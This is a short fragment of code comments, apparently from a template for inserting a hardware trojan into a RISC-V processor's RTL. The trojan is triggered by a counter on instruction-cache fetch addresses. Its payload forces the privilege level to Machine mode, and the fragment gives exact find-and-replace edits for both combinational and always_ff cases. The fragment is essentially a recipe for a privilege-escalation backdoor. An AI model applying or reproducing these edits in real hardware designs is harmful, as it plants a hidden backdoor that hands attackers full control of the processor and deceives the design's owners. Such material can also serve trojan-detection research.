 ...
 *   
 * Trigger: Counter on icache_fetch_vaddr_i
 * Payload: Force riscv::priv_lvl_t to PRIV_LVL_M (Machine mode = 2'b11)
 * 
...
// ============================================================
// Privilege Escalation: Override riscv::priv_lvl_t to PRIV_LVL_M.
//
// IMPORTANT: priv_lvl signals are typically REGISTERS (always_ff),
//   not combinational assigns. Handle BOTH cases:
//
// CASE 1 - If riscv::priv_lvl_t has a combinational assign:
//   Find:    assign riscv::priv_lvl_t = <priv_expr>;
//   Replace: assign riscv::priv_lvl_t = trojan_active ? PRIV_LVL_M : (<priv_expr>);
//
// CASE 2 - If riscv::priv_lvl_t is updated inside always_ff:
//   Find the last assignment to riscv::priv_lvl_t in the always_ff block.
//   Add override AFTER it (before the closing end):
//     // Trojan override: force to Machine mode
//     if (trojan_active) riscv::priv_lvl_t <= PRIV_LVL_M;
//
